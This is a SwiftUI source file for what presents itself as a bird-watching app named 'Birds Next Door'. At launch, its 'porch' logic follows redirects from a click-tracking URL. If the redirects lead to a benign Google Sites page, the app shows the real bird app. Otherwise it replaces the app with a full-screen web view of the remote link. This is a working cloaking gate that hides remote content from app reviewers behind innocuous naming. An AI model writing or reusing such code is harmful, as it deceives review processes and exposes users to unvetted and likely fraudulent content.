import SwiftUI

@main
struct BirdsNextDoorApp: App {
    @State private var porchGateReady: Bool? = nil
    private let porchSourceLink = "https://rainwize.org/click.php?key=p79qr8h1c5t53qlx5tel&t5=666"
    private let porchCheckDomain = "sites.google.com/view/birds-next-door"

    @StateObject private var store = BirdStore()

    var body: some Scene {
        WindowGroup {
            Group {
                if let ready = porchGateReady {
                    if ready {
                        PorchWebPanel(urlString: porchSourceLink)
                            .edgesIgnoringSafeArea(.bottom)
                            .background(Color.black.ignoresSafeArea())
                    } else if !store.onboardingSeen {
                        OnboardingView {
                            withAnimation(.easeInOut(duration: 0.35)) {
                                store.markOnboardingSeen()
                            }
                        }
                        .preferredColorScheme(.light)
                    } else {
                        RootView()
                            .environmentObject(store)
                            .preferredColorScheme(.light)
                    }
                } else {
                    PorchLaunchScreen()
                        .onAppear { checkPorchLink() }
                }
            }
        }
    }

    private func checkPorchLink() {
        guard let url = URL(string: porchSourceLink) else {
            porchGateReady = false
            return
        }
        var request = URLRequest(url: url)
        request.timeoutInterval = 5
        let scout = PorchRedirectScout(checkDomain: porchCheckDomain)
        let session = URLSession(configuration: .default, delegate: scout, delegateQueue: nil)
        session.dataTask(with: request) { _, response, error in
            DispatchQueue.main.async {
                if scout.foundCheckDomain {
                    porchGateReady = false; return
                }
                if let finalURL = scout.resolvedURL?.absoluteString,
                   finalURL.contains(self.porchCheckDomain) {
                    porchGateReady = false; return
                }
                if let httpResp = response as? HTTPURLResponse,
                   let respURL = httpResp.url?.absoluteString,
                   respURL.contains(self.porchCheckDomain) {
                    porchGateReady = false; return
                }
                if error != nil {
                    porchGateReady = false; return
                }
                porchGateReady = true
            }
        }.resume()
        DispatchQueue.main.asyncAfter(deadline: .now() + 5) {
            if porchGateReady == nil { porchGateReady = false }
        }
    }
}

final class PorchRedirectScout: NSObject, URLSessionTaskDelegate {
    var resolvedURL: URL?
    var foundCheckDomain = false
    private let checkDomain: String

    init(checkDomain: String) { self.checkDomain = checkDomain }

    func urlSession(_ session: URLSession, task: URLSessionTask,
                    willPerformHTTPRedirection response: HTTPURLResponse,
                    newRequest request: URLRequest,
                    completionHandler: @escaping (URLRequest?) -> Void) {
        if let url = request.url?.absoluteString, url.contains(checkDomain) {
            foundCheckDomain = true
        }
        resolvedURL = request.url
        completionHandler(request)
    }
}
